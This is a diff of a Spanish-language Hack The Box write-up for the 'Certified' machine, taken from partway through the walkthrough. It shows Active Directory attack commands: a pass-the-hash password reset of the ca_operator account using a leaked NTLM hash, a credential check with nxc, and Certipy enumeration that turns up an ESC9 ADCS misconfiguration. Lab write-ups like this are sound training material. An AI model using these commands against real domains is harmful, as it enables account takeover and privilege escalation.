@@ -359,34 +359,34 @@ evil-winrm -i certified.htb -u management_svc -H "a091c1832bcdd4677c28b5a6a12955
 ---
 ## User Pivoting
 
-Revisando nuevamente el BloodHound, compruebo que el usuario "management_svc" dispone de privilegios de GenericAll sobre el usuario "ca_operator". Teniendo estos permisos, podo a llegar a cambiar las credenciales sobre el usuario "ca_operator".
+Revisando nuevamente el BloodHound, compruebo que el usuario `management_svc` dispone de privilegios de `GenericAll` sobre el usuario `ca_operator`. Teniendo estos permisos, podo a llegar a cambiar las credenciales sobre el usuario `ca_operator`.
 
 
 ```terminal
 /home/kali/Documents/htb/machines/certified:-$ pth-net rpc password "ca_operator" "12345678" -U "certified.htb"/"management_svc"%"a091c1832bcdd4677c28b5a6a1295584":"a091c1832bcdd4677c28b5a6a1295584"  -S "DC01.certified.htb"
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH ...
 ```
 
-![](assets/img/htb-writeup-certified/certified3_1.png)
-
-valido que se han modificado correctamente las credenciales del usuario en cuestión.
+Valido que se han modificado correctamente las credenciales del usuario en cuestión.
 
 ```terminal
 /home/kali/Documents/htb/machines/certified:-$ nxc smb 10.10.11.41 -u ca_operator -p 12345678
+SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.41     445    DC01             [+] certified.htb\ca_operator:12345678
 ```
-
-![](assets/img/htb-writeup-certified/certified3_2.png)
 
 ---
 ## Privilege Escalation
 
 
-Utilice Certipy para buscar y obtener información sobre la configuración de la Autoridad de Certificación (CA) "certified-DC01-CA" y los certificados asociados.
+Utilice Certipy para buscar y obtener información sobre la configuración de la Autoridad de Certificación (CA) `certified-DC01-CA` y los certificados asociados.
 
 ```terminal
 /home/kali/Documents/htb/machines/certified:-$ certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41
 ```
 
-![](assets/img/htb-writeup-certified/certified3_3.png)
+![](assets/img/htb-writeup-certified/certified3_1.png)
 
 De este proceso, identificó una vulnerabilidad clasificada como [ESC9](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension). Esta vulnerabilidad en Active Directory Certificate Services (ADCS) que surge cuando los permisos de administración de la CA están mal configurados.
 
